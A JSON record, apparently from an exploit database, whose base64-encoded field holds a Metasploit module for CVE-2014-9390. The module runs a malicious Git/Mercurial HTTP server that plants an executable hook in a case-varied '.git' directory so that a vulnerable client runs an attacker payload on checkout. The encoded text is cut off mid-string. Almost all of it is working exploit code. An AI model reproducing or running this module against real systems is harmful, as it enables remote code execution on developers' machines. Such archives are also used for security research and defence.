{
    "source": "exploit-database", 
    "exploit": "IyMNCiMgVGhpcyBtb2R1bGUgcmVxdWlyZXMgTWV0YXNwbG9pdDogaHR0cDovL21ldGFzcGxvaXQuY29tL2Rvd25sb2FkDQojIEN1cnJlbnQgc291cmNlOiBodHRwczovL2dpdGh1Yi5jb20vcmFwaWQ3L21ldGFzcGxvaXQtZnJhbWV3b3JrDQojIw0KDQpyZXF1aXJlICdtc2YvY29yZScNCg0KY2xhc3MgTWV0YXNwbG9pdE1vZHVsZSA8IE1zZjo6RXhwbG9pdDo6UmVtb3RlDQogIFJhbmsgPSBFeGNlbGxlbnRSYW5raW5nDQoNCiAgaW5jbHVkZSBNc2Y6OkV4cGxvaXQ6OlJlbW90ZTo6SHR0cFNlcnZlcg0KICBpbmNsdWRlIE1zZjo6RXhwbG9pdDo6UG93ZXJzaGVsbA0KDQogIGRlZiBpbml0aWFsaXplKGluZm8gPSB7fSkNCiAgICBzdXBlcih1cGRhdGVfaW5mbygNCiAgICAgIGluZm8sDQogICAgICAnTmFtZScgPT4gJ01hbGljaW91cyBHaXQgYW5kIE1lcmN1cmlhbCBIVFRQIFNlcnZlciBGb3IgQ1ZFLTIwMTQtOTM5MCcsDQogICAgICAnRGVzY3JpcHRpb24nID0+ICVxKA0KICAgICAgICBUaGlzIG1vZHVsZSBleHBsb2l0cyBDVkUtMjAxNC05MzkwLCB3aGljaCBhZmZlY3RzIEdpdCAodmVyc2lvbnMgbGVzcw0KICAgICAgICB0aGFuIDEuOC41LjYsIDEuOS41LCAyLjAuNSwgMi4xLjQgYW5kIDIuMi4xKSBhbmQgTWVyY3VyaWFsICh2ZXJzaW9ucw0KICAgICAgICBsZXNzIHRoYW4gMy4yLjMpIGFuZCBkZXNjcmliZXMgdGhyZWUgdnVsbmVyYWJpbGl0aWVzLg0KICAgICAgICBPbiBvcGVyYXRpbmcgc3lzdGVtcyB3aGljaCBoYXZlIGNhc2UtaW5zZW5zaXRpdmUgZmlsZSBzeXN0ZW1zLCBsaWtlDQogICAgICAgIFdpbmRvd3MgYW5kIE9TIFgsIEdpdCBjbGllbnRzIGNhbiBiZSBjb252aW5jZWQgdG8gcmV0cmlldmUgYW5kDQogICAgICAgIG92ZXJ3cml0ZSBzZW5zaXRpdmUgY29uZmlndXJhdGlvbiBmaWxlcyBpbiB0aGUgLmdpdA0KICAgICAgICBkaXJlY3Rvcnkgd2hpY2ggY2FuIGFsbG93IGFyYml0cmFyeSBjb2RlIGV4ZWN1dGlvbiBpZiBhIHZ1bG5lcmFibGUNCiAgICAgICAgY2xpZW50IGNhbiBiZSBjb252aW5jZWQgdG8gcGVyZm9ybSBjZXJ0YWluIGFjdGlvbnMgKGZvciBleGFtcGxlLA0KICAgICAgICBhIGNoZWNrb3V0KSBhZ2FpbnN0IGEgbWFsaWNpb3VzIEdpdCByZXBvc2l0b3J5Lg0KICAgICAgICBBIHNlY29uZCB2dWxuZXJhYmlsaXR5IHdpdGggc2ltaWxhciBjaGFyYWN0ZXJpc3RpY3MgYWxzbyBleGlzdHMgaW4gYm90aA0KICAgICAgICBHaXQgYW5kIE1lcmN1cmlhbCBjbGllbnRzLCBvbiBIRlMrIGZpbGUgc3lzdGVtcyAoTWFjIE9TIFgpIG9ubHksIHdoZXJlDQogICAgICAgIGNlcnRhaW4gVW5pY29kZSBjb2RlcG9pbnRzIGFyZSBpZ25vcmFibGUuDQogICAgICAgIFRoZSB0aGlyZCB2dWxuZXJhYmlsaXR5IHdpdGggc2ltaWxhciBjaGFyYWN0ZXJpc3RpY3Mgb25seSBhZmZlY3RzDQogICAgICAgIE1lcmN1cmlhbCBjbGllbnRzIG9uIFdpbmRvd3MsIHdoZXJlIFdpbmRvd3MgInNob3J0IG5hbWVzIg0KICAgICAgICAoTVMtRE9TLWNvbXBhdGlibGUgOC4zIGZvcm1hdCkgYXJlIHN1cHBvcnRlZC4NCiAgICAgICAgVG9kYXkgdGhpcyBtb2R1bGUgb25seSB0cnVseSBzdXBwb3J0cyB0aGUgZmlyc3QgdnVsbmVyYWJpbGl0eSAoR2l0DQogICAgICAgIGNsaWVudHMgb24gY2FzZS1pbnNlbnNpdGl2ZSBmaWxlIHN5c3RlbXMpIGJ1dCBoYXMgdGhlIGZ1bmN0aW9uYWxpdHkgdG8NCiAgICAgICAgc3VwcG9ydCB0aGUgcmVtYWluaW5nIHR3byB3aXRoIGEgbGl0dGxlIHdvcmsuDQogICAgICApLA0KICAgICAgJ0xpY2Vuc2UnID0+IE1TRl9MSUNFTlNFLA0KICAgICAgJ0F1dGhvcicgPT4gWw0KICAgICAgICAnSm9uIEhhcnQgPGpvbl9oYXJ0W2F0XXJhcGlkNy5jb20+JyAjIG1ldGFzcGxvaXQgbW9kdWxlDQogICAgICBdLA0KICAgICAgJ1JlZmVyZW5jZXMnICAgICA9Pg0KICAgICAgICBbDQogICAgICAgICAgWydDVkUnLCAnMjAxNC05MzkwJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9jb21tdW5pdHkucmFwaWQ3LmNvbS9jb21tdW5pdHkvbWV0YXNwbG9pdC9ibG9nLzIwMTUvMDEvMDEvMTItZGF5cy1vZi1oYXhtYXMtZXhwbG9pdGluZy1jdmUtMjAxNC05MzkwLWluLWdpdC1hbmQtbWVyY3VyaWFsJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL2dpdC1ibGFtZS5ibG9nc3BvdC5jb20uZXMvMjAxNC8xMi9naXQtMTg1Ni0xOTUtMjA1LTIxNC1hbmQtMjIxLWFuZC5odG1sJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL2FydGljbGUuZ21hbmUub3JnL2dtYW5lLmxpbnV4Lmtlcm5lbC8xODUzMjY2J10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cHM6Ly9naXRodWIuY29tL2Jsb2cvMTkzOC12dWxuZXJhYmlsaXR5LWFubm91bmNlZC11cGRhdGUteW91ci1naXQtY2xpZW50cyddLA0KICAgICAgICAgIFsnVVJMJywgJ2h0dHBzOi8vd3d3Lm1laG1ldGluY2UubmV0L29uZS1naXQtY29tbWFuZC1tYXktY2F1c2UteW91LWhhY2tlZC1jdmUtMjAxNC05MzkwLWV4cGxvaXRhdGlvbi1mb3Itc2hlbGwvJ10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL21lcmN1cmlhbC5zZWxlbmljLmNvbS93aWtpL1doYXRzTmV3I01lcmN1cmlhbF8zLjIuM18uMjgyMDE0LTEyLTE4LjI5J10sDQogICAgICAgICAgWydVUkwnLCAnaHR0cDovL3NlbGVuaWMuY29tL3JlcG8vaGctc3RhYmxlL3Jldi9jMDJhMDVjYzZmNWUnXSwNCiAgICAgICAgICBbJ1VSTCcsICdodHRwOi8vc2VsZW5pYy5jb20vcmVwby9oZy1zdGFibGUvcmV2LzZkYWQ0MjJlY2M1YSddDQoNCiAgICAgICAgXSwNCiAgICAgICdEaXNjbG9zdXJlRGF0ZScgPT4gJ0RlYyAxOCAyMDE0JywNCiAgICAgICdUYXJnZXRzJyA9Pg0KICAgICAgICBbDQogICAgICAgICAgWw0KICAgICAgICAgICAgJ0F1dG9tYXRpYycsDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICdQbGF0Zm9ybScgPT4gWyAndW5peCcgXSwNCiAgICAgICAgICAgICAgJ0FyY2gnICAgICA9PiBBUkNIX0NNRCwNCiAgICAgICAgICAgICAgJ1BheWxvYWQnICAgICAgICA9Pg0KICAgICAgICAgICAgICAgIHsNCiAgICAgICAgICAgICAgICAgICdDb21wYXQnICAgICAgPT4NCiAgICAgICAgICAgICAgICAgICAgew0KICAgICAgICAgICAgICAgICAgICAgICdQYXlsb2FkVHlwZScgPT4gJ2NtZCBjbWRfYmFzaCcsDQogICAgICAgICAgICAgICAgICAgICAgJ1JlcXVpcmVkQ21kJyA9PiAnZ2VuZXJpYyBiYXNoLXRjcCBwZXJsJw0KICAgICAgICAgICAgICAgICAgICB9DQogICAgICAgICAgICAgICAgfQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0sDQogICAgICAgICAgWw0KICAgICAgICAgICAgJ1dpbmRvd3MgUG93ZXJzaGVsbCcsDQogICAgICAgICAgICB7DQogICAgICAgICAgICAgICdQbGF0Zm9ybScgPT4gWyAnd2luZG93cycgXSwNCiAgICAgICAgICAgICAgJ0FyY2gnICAgICA9PiBbQVJDSF9YODYsIEFSQ0hfWDY0XQ0KICAgICAgICAgICAgfQ0KICAgICAgICAgIF0NCiAgICAgICAgXSwNCiAgICAgICdEZWZhdWx0VGFyZ2V0JyAgPT4gMCkpDQoNCiAgICByZWdpc3Rlcl9vcHRpb25zKA0KICAgICAgWw0KICAgICAgICBPcHRCb29sLm5ldygnR0lUJywgW3RydWUsICdFeHBsb2l0IEdpdCBjbGllbnRzJywgdHJ1ZV0pDQogICAgICBdDQogICAgKQ0KDQogICAgcmVnaXN0ZXJfYWR2YW5jZWRfb3B0aW9ucygNCiAgICAgIFsNCiAgICAgICAgT3B0U3RyaW5nLm5ldygnR0lUX1VSSScsIFtmYWxzZSwgJ1RoZSBVUkkgdG8gdXNlIGFzIHRoZSBtYWxpY2lvdXMgR2l0IGluc3RhbmNlIChlbXB0eSBmb3IgcmFuZG9tKScsICcnXSksDQogICAgICAgIE9wdFN0cmluZy5uZXcoJ01FUkNVUklBTF9VUkknLCBbZmFsc2UsICdUaGUgVVJJIHRvIHVzZSBhcyB0aGUgbWFsaWNpb3VzIE1lcmN1cmlhbCBpbnN0YW5jZSAoZW1wdHkgZm9yIHJhbmRvbSknLCAnJ10pLA0KICAgICAgICBPcHRTdHJpbmcubmV3KCdHSVRfSE9PSycsIFtmYWxzZSwgJ1RoZSBHaXQgaG9vayB0byB1c2UgZm9yIGV4cGxvaXRhdGlvbicsICdwb3N0LWNoZWNrb3V0J10pLA0KICAgICAgICBPcHRTdHJpbmcubmV3KCdNRVJDVVJJQUxfSE9PSycsIFtmYWxzZSwgJ1RoZSBNZXJjdXJpYWwgaG9vayB0byB1c2UgZm9yIGV4cGxvaXRhdGlvbicsICd1cGRhdGUnXSksDQogICAgICAgIE9wdEJvb2wubmV3KCdNRVJDVVJJQUwnLCBbZmFsc2UsICdFbmFibGUgZXhwZXJpbWVudGFsIE1lcmN1cmlhbCBzdXBwb3J0JywgZmFsc2VdKQ0KICAgICAgXQ0KICAgICkNCiAgZW5kDQoNCiAgZGVmIHNldHVwDQogICAgIyB0aGUgZXhwbG9pdCByZXF1aXJlcyB0aGF0IHdlIGFjdCBlbm91Z2ggbGlrZSBhIHJlYWwgTWVyY3VyaWFsIEhUVFAgaW5zdGFuY2UsDQogICAgIyBzbyB3ZSBrZWVwIGEgbWFwcGluZyBvZiBhbGwgb2YgdGhlIGZpbGVzIGFuZCB0aGUgY29ycmVzcG9uZGluZyBkYXRhIHdlJ2xsDQogICAgIyBzZW5kIGJhY2sgYWxvbmcgd2l0aCBhIHRyaWdnZXIgZmlsZSB0aGF0IHNpZ25pZmllcyB0aGF0IHRoZSBnaXQvbWVyY3VyaWFsDQogICAgIyBjbGllbnQgaGFzIGZldGNoZWQgdGhlIG1hbGljaW91cyBjb250ZW50Lg0KICAgIEByZXBvX2RhdGEgPSB7DQogICAgICBnaXQ6IHsgZmlsZXM6IHt9LCB0cmlnZ2VyOiBuaWwgfSwNCiAgICAgIG1lcmN1cmlhbDogeyBmaWxlczoge30sIHRyaWdnZXI6IG5pbCB9DQogICAgfQ0KDQogICAgdW5sZXNzIGRhdGFzdG9yZVsnR0lUJ10gfHwgZGF0YXN0b3JlWydNRVJDVVJJQUwnXQ0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OkJhZENvbmZpZywgJ011c3Qgc3BlY2lmeSBhdCBsZWFzdCBvbmUgR0lUIGFuZC9vciBNRVJDVVJJQUwnKQ0KICAgIGVuZA0KDQogICAgc2V0dXBfZ2l0DQogICAgc2V0dXBfbWVyY3VyaWFsDQoNCiAgICBzdXBlcg0KICBlbmQNCg0KICBkZWYgc2V0dXBfZ2l0DQogICAgcmV0dXJuIHVubGVzcyBkYXRhc3RvcmVbJ0dJVCddDQogICAgIyBVUkkgbXVzdCBzdGFydCB3aXRoIGEgLw0KICAgIHVubGVzcyBnaXRfdXJpICYmIGdpdF91cmkgPX4gL15cLy8NCiAgICAgIGZhaWxfd2l0aChGYWlsdXJlOjpCYWRDb25maWcsICdHSVRfVVJJIG11c3Qgc3RhcnQgd2l0aCBhIC8nKQ0KICAgIGVuZA0KICAgICMgc2FuaXR5IGNoZWNrIHRoZSBtYWxpY2lvdXMgaG9vazoNCiAgICBpZiBkYXRhc3RvcmVbJ0dJVF9IT09LJ10uYmxhbms/DQogICAgICBmYWlsX3dpdGgoRmFpbHVyZTo6QmFkQ29uZmlnLCAnR0lUX0hPT0sgbXVzdCBub3QgYmUgYmxhbmsnKQ0KICAgIGVuZA0KDQogICAgIyBJbiAuZ2l0L2hvb2tzLyBkaXJlY3RvcnksIHNwZWNpYWxseSBuYW1lZCBmaWxlcyBhcmUgc2hlbGwgc2NyaXB0cyB0aGF0DQogICAgIyBhcmUgZXhlY3V0ZWQgd2hlbiBwYXJ0aWN1bGFyIGV2ZW50cyBvY2N1ci4gIEZvciBleGFtcGxlLCBpZg0KICAgICMgLmdpdC9ob29rcy9wb3N0LWNoZWNrb3V0IHdhcyBhbiBleGVjdXRhYmxlIHNoZWxsIHNjcmlwdCwgYSBnaXQgY2xpZW50DQogICAgIyB3b3VsZCBleGVjdXRlIHRoYXQgZmlsZSBldmVyeSB0aW1lIGFueXRoaW5nIGlzIGNoZWNrZWQgb3V0LiAgVGhlcmUgYXJlDQogICAgIyB2YXJpb3VzIG90aGVyIGZpbGVzIHRoYXQgY2FuIGJlIHVzZWQgdG8gYWNoaWV2ZSBzaW1pbGFyIGdvYWxzIGJ1dCByZWxhdGVkDQogICAgIyB0byBjb21taXR0aW5nLCB1cGRhdGluZywgZXRjLg0KICAgICMNCiAgICAjIFRoaXMgdnVsbmVyYWJpbGl0eSBhbGxvd3MgYSBzcGVjaWFsbHkgY3JhZnRlZCBmaWxlIHRvIGJ5cGFzcyBHaXQncw0KICAgICMgYmxhY2tsaXN0IGFuZCBvdmVyd3JpdGUgdGhlIHNlbnNpdGl2ZSAuZ2l0L2hvb2tzLyBmaWxlcyB3aGljaCBjYW4gYWxsb3cNCiAgICAjIGFyYml0cmFyeSBjb2RlIGV4ZWN1dGlvbiBpZiBhIHZ1bG5lcmFibGUgR2l0IGNsaWVudCBjYW4gYmUgY29udmluY2VkIHRvDQogICAgIyBpbnRlcmFjdCB3aXRoIGEgbWFsaWNpb3VzIEdpdCByZXBvc2l0b3J5Lg0KICAgICMNCiAgICAjIFRoaXMgYnVpbGRzIGEgZmFrZSBnaXQgcmVwb3NpdG9yeSB1c2luZyB0aGUga25vd2xlZGdlIGZyb206DQogICAgIw0KICAgICMgICBodHRwOi8vc2NoYWNvbi5naXRodWIuaW8vZ2l0Ym9vay83X2hvd19naXRfc3RvcmVzX29iamVjdHMuaHRtbA0KICAgICMgICBodHRwOi8vc2NoYWNvbi5naXRodWIuaW8vZ2l0Ym9vay83X2Jyb3dzaW5nX2dpdF9vYmplY3RzLmh0bWwNCiAgICBjYXNlIHRhcmdldC5uYW1lDQogICAgd2hlbiAnQXV0b21hdGljJw0KICAgICAgZnVsbF9jbWQgPSAiIyEvYmluL3NoXG4je3BheWxvYWQuZW5jb2RlZH1cbiINCiAgICB3aGVuICdXaW5kb3dzIFBvd2Vyc2hlbGwnDQogICAgICBwc2ggPSBjbWRfcHNoX3BheWxvYWQocGF5bG9hZC5lbmNvZGVkLA0KICAgICAgICAgICAgICAgICAgICAgICAgICAgIHBheWxvYWRfaW5zdGFuY2UuYXJjaC5maXJzdCwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICByZW1vdmVfY29tc3BlYzogdHJ1ZSwNCiAgICAgICAgICAgICAgICAgICAgICAgICAgICBlbmNvZGVfZmluYWxfcGF5bG9hZDogdHJ1ZSkNCiAgICAgIGZ1bGxfY21kID0gIiMhL2Jpbi9zaFxuI3twc2h9Ig0KICAgIGVuZA0KDQogICAgc2hhMSwgY29udGVudCA9IGJ1aWxkX29iamVjdCgnYmxvYicsIGZ1bGxfY21kKQ0KICAgIHRyaWdnZXIgPSAiL29iamVjdHMvI3tnZXRfcGF0aChzaGExKX0iDQogICAgQHJlcG9fZGF0YVs6Z2l0XVs6dHJpZ2dlcl0gPSB0cmlnZ2VyDQogICAgQHJlcG9fZGF0YVs6Z2l0XVs6ZmlsZXNdW3RyaWdnZXJdID0gY29udGVudA0KICAgICMgYnVpbGQgdHJlZSB0aGF0IHBvaW50cyB0byB0aGUgYmxvYg0KICAgIHNoYTEsIGNvbnRlbnQgPSBidWlsZF9vYmplY3QoJ3RyZWUnLCAiMTAwNzU1ICN7ZGF0YXN0b3JlWydHSVRfSE9PSyddfVwwI3tbc2hhMV0ucGFjaygnSConKX0iKQ0KICAgIEByZXBvX2RhdGFbOmdpdF1bOmZpbGVzXVsiL29iamVjdHMvI3tnZXRfcGF0aChzaGExKX0iXSA9IGNvbnRlbnQNCiAgICAjIGJ1aWxkIGEgdHJlZSB0aGF0IHBvaW50cyB0byB0aGUgaG9va3MgZGlyZWN0b3J5IGluIHdoaWNoIHRoZSBob29rIGxpdmVzLCBjYWxsZWQgaG9va3MNCiAgICBzaGExLCBjb250ZW50ID0gYnVpbGRfb2JqZWN0KCd0cmVlJywgIjQwMDAwIGhvb2tzXDAje1tzaGExXS5wYWNrKCdIKicpfSIpDQogICAgQHJlcG9fZGF0YVs6Z2l0XVs6ZmlsZXNdWyIvb2JqZWN0cy8je2dldF9wYXRoKHNoYTEpfSJdID0gY29udGVudA0KICAgICMgYnVpbGQgYSB0cmVlIHRoYXQgcG9pbnRzIHRvIHRoZSBwYXJ0aWFsbHkgdXBwZXJjYXNlZCAuZ2l0IGRpcmVjdG9yeSBpbg0KICAgICMgd2hpY2ggaG9va3MgbGl2ZQ0KICAgIHZhcmlhbnRzID0gW10NCiAgICAldyhnIEcpLiBlYWNoIGRvIHxnfA0KICAgICAgJXcoaSBJKS5lYWNoIGRvIHxpfA0KICAgICAgICAldyh0IFQpLmVhY2ggZG8gfHR8DQogICAgICAgICAgZ2l0ID0gZyArIGkgKyB0DQogICAgICAgICAgdmFyaWFudHMgPDwgZ2l0IHVubGVzcyBnaXQuY2hhcnMubm9uZT8geyB8Y3wgYyA9PSBjLnVwY2FzZSB9DQogICAgICAgIGVuZA0KICAgICAgZW5kDQogICAgZW5kDQogICAgZ2l0X2RpciA9ICcuJyArIHZhcmlhbnRzLnNhbXBsZQ0KICAgIHNoYTEsIGNvbnRlbnQgPSBidWlsZF9vYmplY3QoJ3RyZWUnLCAiNDAwMDAgI3tnaXRfZGlyfVwwI3tbc2hhMV0ucGFjaygnSConKX0iKQ0KICAgIEByZXBvX2RhdGFbOmdpdF1bOmZpbGVzXVsiL29iamVjdHMvI3tnZXRfcGF0aChzaGExKX0iXSA9IGNvbnRlbnQNCiAgICAjIGJ1aWxkIHRoZSBzdXBwb3NlZCBjb21taXQgdGhhdCBkcm9wcGVkIHRoaXMgZmlsZSwgd2hpY2ggaGFzIGEgcmFuZG9tIHVzZXIvY29tcGFueQ0KICAgIGVtYWlsID0gUmV4OjpUZXh0LnJhbmRfbWFpbF9hZGRyZXNzDQogICAgZmlyc3QsIGxhc3QsIGNvbXBhbnkgPSBlbWFpbC5zY2FuKC8oW15cLl0rKVwuKFteXC5dKylAKC4qKSQvKS5mbGF0dGVuDQogICAgZnVsbF9uYW1lID0gIiN7Zmlyc3QuY2FwaXRhbGl6ZX0gI3tsYXN0LmNhcGl0YWxpemV9Ig0KICAgIHRzdGFtcCA9IFRpbWUubm93LnRvX2kNCiAgICBhdXRob3JfdGltZSA9IHJhbmQodHN0YW1wKQ0KICAgIGNvbW1pdF90aW1lID0gcmFuZChhdXRob3JfdGltZSkNCiAgICB0el9vZmYgPSByYW5kKDEwKQ0KICAgIGNvbW1pdCA9ICJhdXRob3IgI3tmdWxsX25hbWV9IDwje2VtYWlsfT4gI3thdXRob3JfdGltZX0gLTAje3R6X29mZn0wMFxuIiBcDQogICAgICAgICAgICAgImNvbW1pdHRlciAje2Z1bGxfbmFtZX0gPCN7ZW1haWx9PiAje2NvbW1pdF90aW1lfSAtMCN7dHpfb2ZmfTAwXG4iIFwNCiAgICAgICAgICAgICAiXG4iIFwNCiAgICAgICAgICAgICAiSW5pdGlhbCBjb21taXQgdG8gb3BlbiBnaXQgcmVwb3NpdG9yeSBmb3IgI3tjb21wYW55fSFcbiINCiAgICBpZiBkYXRhc3RvcmVbJ1ZFUkJPU0UnXQ0KICAgICAgdnByaW50X3N0YXR1cygiTWFsaWNpb3VzIEdpdCBjb21taXQgb2YgI3tnaXRfZGlyfS8je2RhdGFzdG9yZVsnR0lUX0hPT0snXX0gaXM6IikNCiAgICAgIGNvbW1pdC5lYWNoX2xpbmUgeyB8bHwgdnByaW50X3N0YXR1cyhsLnN0cmlwKSB9DQogICAgZW5kDQogICAgc2hhMSwgY29udGVudCA9IGJ1aWxkX29iamVjdCgnY29tbWl0JywgInRyZWUgI3tzaGExfVxuI3tjb21taXR9IikNCiAgICBAcmVwb19kYXRhWzpnaXRdWzpmaWxlc11bIi9vYmplY3RzLyN7Z2V0X3BhdGgoc2hhMSl9Il0gPSBjb250ZW50DQogICAgIyBidWlsZCBIRUFEDQogICAgQHJlcG9fZGF0YVs6Z2l0XVs6ZmlsZXNdWycvSEVBRCddID0gInJlZjogcmVmcy9oZWFkcy9tYXN0ZXJcbiINCiAgICAjIGxhc3RseSwgYnVpbGQgcmVmcw0KICAgIEByZXBvX2RhdGFbOmdpdF1bOmZpbGVzXVsnL2luZm8vcmVmcyddID0gIiN7c2hhMX1cdHJlZnMvaGVhZHMvbWFzdGVyXG4iDQogIGVuZA0KDQogIGRlZiBzZXR1cF9tZXJjdXJpYWwNCiAgICByZXR1cm4gdW5sZXNzIGRhdGFzdG9yZVsnTUVSQ1VSSUFMJ10NCiAgICAjIFVSSSBtdXN0IHN0YXJ0IHdpdGggYSAvDQogICAgdW5sZXNzIG1lcmN1cmlhbF91cmkgJiYgbWVyY3VyaWFsX3VyaSA9fiAvXlwvLw0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OkJhZENvbmZpZywgJ01FUkNVUklBTF9VUkkgbXVzdCBzdGFydCB3aXRoIGEgLycpDQogICAgZW5kDQogICAgIyBzYW5pdHkgY2hlY2sgdGhlIG1hbGljaW91cyBob29rDQogICAgaWYgZGF0YXN0b3JlWydNRVJDVVJJQUxfSE9PSyddLmJsYW5rPw0KICAgICAgZmFpbF93aXRoKEZhaWx1cmU6OkJhZENvbmZpZywgJ01FUkNVUklBTF9IT09LIG11c3Qgbm90IGJlIGJsYW5rJykNCiAgICBlbmQNCiAgICAjIHdlIGZha2UgdGhlIE1lcmN1cmlhbCBIVFRQIHByb3RvY29sIHN1Y2ggdGhhdCB3ZSBhcmUgY29tcGxpYW50IGFzIHBvc3NpYmxlIGJ1dA0KICAgICMgYWxzbyBhcyBzaW1wbGUgYXMgcG9zc2libGUgc28gdGhhdCB3ZSBkb24ndCBoYXZlIHRvIHN1cHBvcnQgYWxsIG9mIHRoZSBwcm90b2NvbA0KICAgICMgY29tcGxleGl0aWVzLiAgVGFrZW4gZnJvbToNCiAgICAjICAgaHR0cDovL21lcmN1cmlhbC5zZWxlbmljLmNvbS93aWtpL0h0dHBDb21tYW5kUHJvdG9jb2wNCiAgICAjICAgaHR0cDovL3NlbGVuaWMuY29tL2hnL2ZpbGUvdGlwL21lcmN1cmlhbC93aXJlcHJvdG8ucHkNCiAgICBAcmVwb19kYXRhWzptZXJjdXJpYWxdWzpmaWxlc11bJz9jbWQ9Y2FwYWJpbGl0aWVzJ10gPSAnaGVhZHMgZ2V0YnVuZGxlPUhHMTBVTicNCiAgICBmYWtlX3NoYTEgPSAnZTZjMzljNTA3ZDcwNzljZmZmNDk2M2EwMWVhM2ExOTViODU1ZDgxNCcNCiAgICBAcmVwb19kYXRhWzptZXJjdXJpYWxdWzpmaWxlc11bJz9jbWQ9aGVhZHMnXSA9ICIje2Zha2Vfc2hhMX1cbiINCiAgICAjIFRPRE86IHByb3Blcmx5IGJ1bmRsZSB0aGlzIHVzaW5nIHRoZSBpbmZvcm1hdGlvbiBpbiBodHRwOi8vbWVyY3VyaWFsLnNlbGVuaWMuY29tL3dpa2kvQnVuZGxlRm9ybWF0DQogICAgQHJlcG9fZGF0YVs6bWVyY3VyaWFsXVs6ZmlsZXNdWyI/Y21kPWdldGJ1bmRsZSZjb21tb249I3snMCcgKiA0MH0maGVhZHM9I3tmYWtlX3NoYTF9Il0gPSBabGliOjpEZWZsYXRlLmRlZmxhdGUoIkhHMTBVTmZvb2Zvb2ZvbyIpDQoNCiAgICAjIFRPRE86IGZpbmlzaCBidWlsZGluZyB0aGUgZmFrZSByZXBvc2l0b3J5DQogIGVuZA0KDQogICMgQnVpbGQncyBhIEdpdCBvYmplY3QNCiAgZGVmIGJ1aWxkX29iamVjdCh0eXBlLCBjb250ZW50KQ0KICAgICMgdGFrZW4gZnJvbSBodHRwOi8vc2NoYWNvbi5naXRodWIuaW8vZ2l0Ym9vay83X2hvd19naXRfc3RvcmVzX29iamVjdHMuaHRtbA0KICAgIGhlYWRlciA9ICIje3R5cGV9ICN7Y29udGVudC5zaXplfVwwIg0KICAgIHN0b3JlID0gaGVhZGVyICsgY29udGVudA0KICAgIFtEaWdlc3Q6OlNIQTEuaGV4ZGlnZXN0KHN0b3JlKSwgWmxpYjo6RGVmbGF0ZS5kZWZsYXRlKHN0b3JlKV0NCiAgZW5kDQoNCiAgIyBSZXR1cm5zIHRoZSBHaXQgb2JqZWN0IHBhdGggbmFtZSB0aGF0IGEgZmlsZSB3aXRoIHRoZSBwcm92aWRlZCBTSEExIHdpbGwgcmVzaWRlIGluDQogIGRlZiBnZXRfcGF0aChzaGExKQ0KICAgIHNoYTFbMC4uLjJdICsgJy8nICsgc2hhMVsyLi40MF0NCiAgZW5kDQoNCiAgZGVmIGV4cGxvaXQNCiAgICBzdXBlcg0KICBlbmQNCg0KICBkZWYgcHJpbWVyDQogICAgIyBhZGQgdGhlIGdpdCBhbmQgbWVyY3VyaWFsIFVSSXMgYXMgbmVjZXNzYXJ5DQogICAgaWYgZGF0YXN0b3JlWydHSVQnXQ0KICAgICAgaGFyZGNvZGVkX3VyaXBhdGgoZ2l0X3VyaSkNCiAgICAgIHByaW50X3N0YXR1cygiTWFsaWNpb3VzIEdpdCBVUkkgaXMgI3tVUkkucGFyc2UoZ2V0X3VyaSkubWVyZ2UoZ2l0X3VyaSl9IikNCiAgICBlbmQNCiAgICBpZiBkYXRhc3RvcmVbJ01FUkNVUklBTCddDQogICAgICBoYXJkY29kZWRfdXJpcGF0aChtZXJjdXJpYWxfdXJpKQ0KICAgICAgcHJpbnRfc3RhdHVzKCJNYWxpY2lvdXMgTWVyY3VyaWFsIFVSSSBpcyAje1VSSS5wYXJzZShnZXRfdXJpKS5tZXJnZShtZXJjdXJpYWxfdXJpKX0iKQ0KICAgIGVuZA0KICBlbmQNCg0KICAjIGhhbmRsZXMgcm91dGluZyBhbnkgcmVxdWVzdCB0byB0aGUgbW9jayBnaXQsIG1lcmN1cmlhbCBvciBzaW1wbGUgSFRNTCBhcyBuZWNlc3NhcnkNCiAgZGVmIG9uX3JlcXVlc3RfdXJpKGNsaSwgcmVxKQ0KICAgICMgaWYgdGhlIFVSSSBpcyBvbmUgb2Ygb3VyIHJlcG9zaXRvcmllcyBhbmQgdGhlIHVzZXItYWdlbnQgaXMgdGhhdCBvZiBnaXQvbWVyY3VyaWFsDQogICAgIyBzZW5kIGJhY2sgdGhlIGFwcHJvcHJpYXRlIGRhdGEsIG90aGVyd2lzZSBqdXN0IHNob3cgdGhlIEhUTUwgdmVyc2lvbg0KICAgIGlmICh1c2VyX2FnZW50ID0gcmVxLmhlYWRlcnNbJ1VzZXItQWdlbnQnXSkNCiAgICAgIGlmIGRhdGFzdG9yZVsnR0lUJ10gJiYgdXNlcl9hZ2VudCA9fiAvXmdpdFwvLyAmJiByZXEudXJpLnN0YXJ0X3dpdGg/KGdpdF91cmkpDQogICAgICAgIGRvX2dpdChjbGksIHJlcSkNCiAgICAgICAgcmV0dXJuDQogICAgICBlbHNpZiBkYXRhc3RvcmVbJ01FUkNVUklBTCddICYmIHVzZXJfYWdlbnQgPX4gL15tZXJjdXJpYWxcLy8gJiYgcmVxLnVyaS5zdGFydF93aXRoPyhtZXJjdXJpYWxfdXJpKQ0KICAgICAgICBkb19tZXJjdXJpYWwoY2xpLCByZXEpDQogICAgICAgIHJldHVybg0KICAgICAgZW5kDQogICAgZW5kDQoNCiAgICBkb19odG1sKGNsaSwgcmVxKQ0KICBlbmQNCg0KICAjIHNpbXVsYXRlcyBhIEdpdCBIVFRQIHNlcnZlcg0KICBkZWYgZG9fZ2l0KGNsaSwgcmVxKQ0KICAgICMgZGV0ZXJtaW5lIGlmIHRoZSByZXF1ZXN0ZWQgZmlsZSBpcyBzb21ldGhpbmcgd2Uga25vdyBob3cgdG8gc2VydmUgZnJvbSBvdXINCiAgICAjIGZha2UgcmVwb3NpdG9yeSBhbmQgc2VuZCBpdCBpZiBzbw0KICAgIHJlcV9maWxlID0gVVJJLnBhcnNlKHJlcS51cmkpLnBhdGguZ3N1YigvXiN7Z2l0X3VyaX0vLCAnJykNCiAgICBpZiBAcmVwb19kYXRhWzpnaXRdWzpmaWxlc10ua2V5PyhyZXFfZmlsZSkNCiAgICAgIHZwcmludF9zdGF0dXMoIlNlbmRpbmcgR